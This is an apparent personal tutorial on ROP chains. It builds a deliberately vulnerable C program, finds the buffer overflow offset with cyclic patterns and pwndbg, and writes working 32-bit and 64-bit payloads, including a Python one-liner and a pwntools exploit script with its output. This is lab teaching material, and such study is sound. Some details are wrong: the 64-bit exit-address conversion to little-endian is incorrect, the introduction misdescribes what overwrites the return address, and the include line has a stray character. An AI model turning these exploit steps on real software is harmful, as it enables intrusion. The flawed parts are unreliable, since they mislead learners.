---
description: 10/04/2023
---

# â›“ ROP Chains 101

## Introduction

<mark style="color:yellow;">**Return-Oriented Programming**</mark> (<mark style="color:yellow;">**ROP**</mark>) will allow you to utilize functions either found in the program or dynamically linked in a shared library such as `libc`.&#x20;

When you complete a function's flow of execution, it will execute a `ret` instruction, likely to `main()`. We want to overwrite this `ret` instruction with the `ebp` address of our target function instead.

## 32-bit Exploitation

`rop1.c`:

```c
#include <stdio.h>>
#include <string.h>

void rop1() 
{
    printf("ROP 1!\n");
}

void rop2() {
    printf("ROP 2!\n");
}

void rop3() {
    printf("ROP 3!\n");
}

void vulnerable(char* string) 
{
    char buffer[100];
    strcpy(buffer, string);
}

int main(int argc, char** argv) 
{
    vulnerable(argv[1]);
    return 0;
}
```

<mark style="color:yellow;">Notice how this program requires the usage of an argument</mark>, whcih will utilize `strcpy()` to store the argument in our buffer and variable, `string`.&#x20;

#### Compiling our binary

```
gcc rop1.c -o rop1 -m32 -fno-stack-protector -no-pie -z execstack
```

### ROP Chain Setup

The ROP chain for this program could have many variations, but one could be: `rop1()` -> `rop2()` -> `rop3` -> `exit()`(dynamically-linked to `libc`).

Notice how this is combining _**ret2libc**_ and _**ret2win**_ techniques.

### Finding `EBP` Offset

**Generate a cyclic pattern of 200-bytes:**

```
cyclic 200
```

**Then, copy/paste the pattern and send it to the program as an argument:**

{% code overflow="wrap" %}
```
r aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption><p>Generating pattern to find <code>EBP</code> offset</p></figcaption></figure>

Great, we now found our padding.&#x20;

It will be 108 because we are subtracting 4-bytes to make room for the `EIP`.

### Using `pwndbg` to find addresses

```
disass rop1
   0x08049182 <+0>:     push   ebp
   
disass rop2
   0x080491ad <+0>:     push   ebp
   
disass rop3
   0x080491d8 <+0>:     push   ebp

disass exit
   0xf7dbb460 <+0>:     endbr32
```

### Using `objdump` to find addresses

```
objdump -d rop1 | grep rop1
rop1:     file format elf32-i386
08049182 <rop1>:

objdump -d rop1 | grep rop2
080491ad <rop2>:

objdump -d rop1 | grep rop3
080491d8 <rop3>:
```

### Payload Structure

**Payload Structure to achieve our ROP chain:**&#x20;

`AAAA`'s (to get to `EIP`) + `B`'s (to overwrite `EBP` with garbage) + `&rop1` + `&rop2` + `&rop3` + `&exit`

**Remember:** <mark style="color:yellow;">We will need to place our obtained addresses above in little-endian format in order for our payload to work</mark>.

### Using `python3` to Manually Exploit our Target Binary

{% code overflow="wrap" %}
```
./rop1 "$(python3 -c "import sys; sys.stdout.buffer.write(b'A'*108 + b'\x42\x42\x42\x42' + b'\x82\x91\x04\x08' + b'\xad\x91\x04\x08' + b'\xd8\x91\x04\x08' + b'\x60\xb4\xdb\xf7')")"
```
{% endcode %}

#### Result

```
./rop1 "$(python3 -c "import sys; sys.stdout.buffer.write(b'A'*108 + b'\x42\x42\x42\x42' + b'\x82\x91\x04\x08' + b'\xad\x91\x04\x08' + b'\xd8\x91\x04\x08' + b'\x60\xb4\xdb\xf7')")"
ROP 1!
ROP 2!
ROP 3!
Segmentation fault
```

### Using pwntools to Automate our Exploit Development

`exploit.py`:

```python
#!/usr/bin/python3
from pwn import *
import sys

# Set up pwntools for the correct architecture and target
exe = './rop1'
exe = context.binary = ELF(exe, checksec=False)
libc = ELF('/lib/i386-linux-gnu/libc.so.6', checksec=False)
p = process(exe.path)
# This will automatically get context arch, bits, os etc
# Change logging level to help with debugging (error/warning/info/debug)
#context.log_level = 'debug'

# DEBUGGING and ARGUMENTS
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)
    
# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================


# How many bytes to the instruction pointer (EIP)?
padding = 108
junk = b'\x42\x42\x42\x42'
exitFunc = 0xf7dbb460
# rop1 = 0x08049182
# rop2 = 0x080491ad
# rop3 = 0x080491d8

rop = ROP(exe)
rop.rop1()
rop.rop2()
rop.rop3()

payload = flat(
    b'A' * padding,
    junk,
    rop.chain(),
    exitFunc
)

# Write the payload to file
write('pwntoolsPayload', payload)
print("[+] Wrote payload to file named pwntoolsPayload")

# Send the payload
p = process([exe.path, payload])

# # Receive the flag
p.interactive()
```

## 64-bit Exploitation

Given the same binary as above, let's compile it as a 64-bit binary and remove the `-m32` flag for `gcc`:

```
gcc rop1.c -o rop1-x64 -fno-stack-protector -no-pie -z ex
ecstack
```

### Using `pwndbg` to find addresses

```
disass rop1
Dump of assembler code for function rop1:
   0x0000000000401156 <+0>:     endbr64
   
disass rop2
Dump of assembler code for function rop2:
   0x000000000040116d <+0>:     endbr64
   
disass rop3
Dump of assembler code for function rop3:
   0x0000000000401184 <+0>:     endbr64
```

### Using `objdump` to find addresses

```
 objdump -d rop1-x64 | grep rop1
rop1-x64:     file format elf64-x86-64
0000000000401156 <rop1>:

 objdump -d rop1-x64 | grep rop2
000000000040116d <rop2>:

objdump -d rop1-x64 | grep rop3
0000000000401184 <rop3>:
```

### Finding `ret` Gadget

```
ropper --file=rop1-x64 --search ret
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: ret

[INFO] File: rop1-x64
0x000000000040101a: ret;
```

### Payload Structure

`AAAA`'s (to get to `RIP`) + `B`'s (to overwrite `RBP` with garbage) + `&ret_gadget` + `&rop1` + `&rop2` + `&rop3` + `&exit`

Great, we now have all the information we need, we just need to put it all in little-endian format to make it work in our payload.

#### Converting Addresses to Little-Endian

`&rop1()`: `0000000000401156` -> `\x56\x11\x40\x00\x00\x00\x00\x00`

`&rop2()`: `000000000040116d` -> `\x6d\x11\x40\x00\x00\x00\x00\x00`

`&rop3()`: `0000000000401184` -> `\x84\x11\x40\x00\x00\x00\x00\x00`

`&exit()`: `0x00007ffff7dd05f0` -> `\xf0\x05\xdd\xf7\xff\xff\x07\x00`

`&ret_gadget`: `0x000000000040101a` -> `\x1a\x10\x40\x00\x00\x00\x00\x00`

